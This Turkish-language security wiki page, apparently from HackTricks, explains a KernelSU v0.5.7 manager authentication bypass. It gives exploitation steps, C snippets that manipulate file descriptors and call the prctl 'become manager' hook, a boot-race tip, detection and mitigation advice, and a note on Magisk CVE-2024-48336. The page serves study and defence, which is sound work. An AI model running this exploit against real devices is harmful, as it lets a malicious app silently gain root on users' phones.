# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

KernelSU, APatch ve SKRoot gibi Rooting frameworks, Android/Linux kernel'ını patch'ler veya hook'lar ve ayrıcalıksız bir userspace manager app'e ayrıcalıklı işlevsellik sunar. Magisk aşağıda ayrı olarak ele alınmıştır; çünkü CVE-2024-48336, bu KernelSU syscall path'i yerine manager tarafında code loading içeriyordu.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

Bu sayfa, hem red hem de blue team'lerin attack surface'lerini, exploitation primitive'lerini ve sağlam mitigation'ları anlamasına yardımcı olmak amacıyla, public research'te (özellikle Zimperium'un KernelSU v0.5.7 analysis'inde) ortaya çıkarılan teknikleri ve tuzakları soyutlar.<sup>[[1]](#references)</sup>

---
## Mimari pattern: syscall-hooked manager channel

- KernelSU v0.5.7'de kernel üzerindeki bir hook, userspace'ten magic value, command ID ve command-specific argument'ları alır.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- Caller önce `CMD_BECOME_MANAGER` ile manager status ister. Authorization command-specific'tir: `CMD_GRANT_ROOT`, manager/allowlist state'ini kontrol eder; `CMD_ALLOW_SU` yalnızca manager'a özeldir ve `CMD_SET_SEPOLICY` bu version'da yalnızca root içindir.<sup>[[2]](#references)[[11]](#references)</sup>
- Diğer command'lar version/configuration sorgular veya framework event'lerini bildirir.<sup>[[2]](#references)</sup>
- Her app bu syscall interface'ini çağırabildiğinden, manager authentication'ın doğruluğu kritik öneme sahiptir.<sup>[[1]](#references)[[2]](#references)</sup>

Örnek (KernelSU design):
- Hooked syscall: prctl
- KernelSU handler'a yönlendirmek için magic value: 0xDEADBEEF
- Command'lar şunları içerir: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, vb.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## KernelSU v0.5.7 authentication flow (uygulandığı şekliyle)

Userspace `prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...)` çağırdığında KernelSU şunları doğrular:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Path prefix check
- Sağlanan path, caller UID için beklenen bir prefix ile başlamalıdır; örneğin `/data/data/<pkg>` veya `/data/user/<id>/<pkg>`.
- Reference: core_hook.c (v0.5.7) path prefix logic.<sup>[[2]](#references)</sup>

2) Ownership check
- Path, caller UID'ye ait olmalıdır.
- Reference: core_hook.c (v0.5.7) ownership logic.<sup>[[2]](#references)</sup>

3) FD table scan üzerinden APK signature check
- Calling process'in açık file descriptor'ları, descriptor order artacak şekilde taranır.
- Her bir regular file için path'in `/data/app/` ile başlayıp `/base.apk` ile bitmesi ve path'in, sağlanan data-directory path'inden türetilen package substring'ini içermesi gerekir.
- Bu path check'lerini geçen ilk candidate'ın signature'ı doğrulanır.
- APK v2 signature parse edilir ve official manager certificate'a karşı doğrulanır.
- References: manager.c (FD'lerin iterate edilmesi), apk_sign.c (APK v2 verification).<sup>[[3]](#references)[[4]](#references)</sup>

Tüm check'ler geçerse kernel, manager'ın UID'sini geçici olarak cache'ler; manager-only command'lar daha sonra bu UID'yi kabul ederken, diğer command'lar kendi UID'lerini veya allowlist check'lerini korur.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Vulnerability class: path-derived APK selection'a güvenme

KernelSU v0.5.7, signature result'ını PackageManager'ın installed package identity'sine bind etmez. `manager.c` içinde package test'i yalnızca bir path substring check'idir (`strstr(cwd, pkg)`); ardından bu testi geçen ilk candidate signature-check edilir. Bu nedenle attacker, genuine manager APK'sını attacker'ın package name'ini de içeren bir `/data/app/` path'i altında yerleştirebilir ve seçilecek ilk candidate olmasını sağlayabilir.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

Bu trust-by-indirection, ayrıcalıksız bir app'in manager'ın signing key'ine sahip olmadan manager'ı impersonate etmesine olanak tanır.<sup>[[1]](#references)</sup>

Exploited key properties:<sup>[[1]](#references)[[3]](#references)</sup>
- FD scan, descriptor index'e göre sıralanır ve package check, doğrulanmış bir package-to-APK identity binding yerine path substring testidir.
- `open()` kullanılabilir en düşük FD'yi döndürür. Attacker, daha düşük numaralı FD'leri önce kapatarak sıralamayı kontrol edebilir.
- Bundled manager APK, official manager signature'ını korurken attacker'ın package string'ini içeren bir path'te `/data/app/` altına yerleştirilebilir.

---
## Attack preconditions

Somut KernelSU v0.5.7 case'i şunları gerektirir:<sup>[[1]](#references)[[3]](#references)</sup>

- Device'ın vulnerable bir rooting framework ile (örneğin KernelSU v0.5.7) zaten rooted olması.
- Attacker'ın yerel olarak arbitrary unprivileged code çalıştırabilmesi (Android app process).
- v0.5.7 implementation'ı için `current->real_parent` UID 0 olmalıdır (source comment bunu zygote direct-child requirement olarak açıklar); `manager.c` diğer parent'ları reject eder.<sup>[[3]](#references)</sup>
- Real manager'ın henüz authenticated olmamış olması (örneğin reboot'un hemen ardından). Bazı framework'ler success sonrasında manager UID'sini cache'ler; race'i kazanmanız gerekir.<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps (cited demo video, public proof of concept'in çalışırkenki halini gösterir):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Prefix ve ownership check'lerini karşılamak için kendi app data directory'nize ait geçerli bir path oluşturun.
2) Genuine KernelSU Manager base.apk'sını package string'inizi içeren bir path'te `/data/app/` altına yerleştirin; ardından bunu kendi base.apk'nizden daha düşük numaralı bir FD üzerinden açın.
3) Check'leri geçmek için `prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...)` çağırın.
4) `CMD_GRANT_ROOT` kullanın; ardından kalıcı su için `CMD_ALLOW_SU` kullanın; root elde ettikten sonra ve yalnızca desteklenen yerlerde root-only `CMD_SET_SEPOLICY` çağırın.

Step 2 (FD ordering) için practical notes:<sup>[[1]](#references)</sup>
- `/proc/self/fd` symlink'lerini tarayarak kendi process'inizin kendi `/data/app/*/base.apk` dosyasına ait FD'sini belirleyin.
- Düşük numaralı bir FD'yi (örneğin stdin, fd 0) kapatın ve legitimate manager APK'sını önce açarak fd 0'ı (veya kendi base.apk fd'nizden düşük herhangi bir index'i) kullanmasını sağlayın.
- Legitimate manager APK'sını app'inizle bundle edin; böylece path `/data/app/` ile başlamalı, `/base.apk` ile bitmeli ve package string'inizi içermelidir. Örneğin app'inizin `lib` directory'si altındaki bir path bu check'leri karşılayabilir.<sup>[[1]](#references)[[3]](#references)</sup>

Example code snippets (Android/Linux, illustrative only):

Açık FD'leri enumerate ederek base.apk entry'lerini bulun:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Daha düşük numaralı bir FD'yi meşru manager APK'sını gösterecek şekilde zorlayın:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Manager kimlik doğrulaması, KernelSU v0.5.7 `prctl` hook'u aracılığıyla:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
Başarının ardından kullanılabilen ayrıcalıklı komutlar (örnekler):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: mevcut process'i root'a yükselt
- CMD_ALLOW_SU: kalıcı su için package/UID'nizi allowlist'e ekle
- CMD_SET_SEPOLICY: root elde ettikten sonra SELinux policy'sini ayarla; KernelSU v0.5.7 bu komut için UID 0 kontrolü yapar.<sup>[[2]](#references)</sup>

Race/persistence ipucu:
- Yeniden başlatmanın ardından başlamak ve gerçek manager'dan önce authentication denemek için AndroidManifest'e (`RECEIVE_BOOT_COMPLETED`) bir BOOT_COMPLETED receiver kaydedin; permission, `ACTION_BOOT_COMPLETED` alımına izin verir ancak tek başına scheduling priority garantisi vermez.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Detection ve mitigation rehberi

Framework geliştiricileri için:
- Authentication'ı rastgele FD'lere değil, caller'ın package/UID'sine bağlayın:
- Caller'ın package'ını UID'sinden çözümleyin ve FD'leri taramak yerine kurulu package'ın signature'ı ile (PackageManager aracılığıyla) doğrulayın.
- Yalnızca kernel kullanılıyorsa, stable caller identity (task creds) kullanın ve process FD'leri yerine init/userspace helper tarafından yönetilen stable bir source of truth üzerinde doğrulama yapın.
- Identity olarak path-prefix kontrollerini kullanmaktan kaçının; bunlar caller tarafından kolayca karşılanabilir.
- Channel üzerinden nonce-based challenge–response kullanın ve boot sırasında veya önemli olaylarda cache'lenmiş manager identity bilgisini temizleyin.
- Uygun olduğunda generic syscall'leri aşırı yüklemek yerine binder-based authenticated IPC kullanmayı değerlendirin.

Defenders/blue team için:
- Rooting framework'lerinin ve manager process'lerinin varlığını tespit edin; kernel telemetry'niz varsa şüpheli magic constant'larla (ör. 0xDEADBEEF) yapılan prctl çağrılarını izleyin.<sup>[[1]](#references)[[11]](#references)</sup>
- Yönetilen fleet'lerde, boot sonrasında ayrıcalıklı manager komutlarını hızla denemeye başlayan güvenilmeyen package'ların boot receiver'ları için engelleme veya uyarı uygulayın.
- Cihazların patched framework sürümlerine güncellendiğinden emin olun; update sonrasında cache'lenmiş manager ID'lerini geçersiz kılın.

Saldırının sınırlamaları:<sup>[[1]](#references)[[2]](#references)</sup>
- Yalnızca vulnerable bir framework ile önceden root edilmiş cihazları etkiler.
- Genellikle legitimate manager authentication yapmadan önce bir reboot/race window gerekir (bazı framework'ler reset edilene kadar manager UID'sini cache'ler).

---
## Framework'ler arasındaki ilgili notlar

- Password-based auth (ör. historical APatch/SKRoot build'leri), password'ların tahmin edilebilir veya brute-force edilebilir olması ya da validation'ların hatalı olması durumunda zayıf olabilir.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Package/signature-based auth (ör. KernelSU), prensipte daha güçlüdür ancak FD taramaları üzerinden seçilen path-derived artefact'lara değil, actual caller'a bağlanmalıdır.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336, doğrulanmamış bir GMS package'ından code yükleyen pre-Canary 27007 build'lerini etkiledi; bu durum local bir app'in Magisk app içinde code execute etmesine ve user interaction olmadan root'a yükselmesine olanak tanıdı.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – Tüm Kötülüklerin Root'u: Mobil Cihazınızı Tehlikeye Atabilecek Güvenlik Açıkları](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – core_hook.c authentication kontrolleri](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – manager.c FD iterasyonu, package kontrolü ve signature çağrısı](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – apk_sign.c APK v2 doğrulaması](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [KernelSU projesi](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Magisk issue #8279 – GMS'nin system app olduğunu doğrulama](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [KSU PoC demo videosu (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – ksu.h command identifier'ları](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
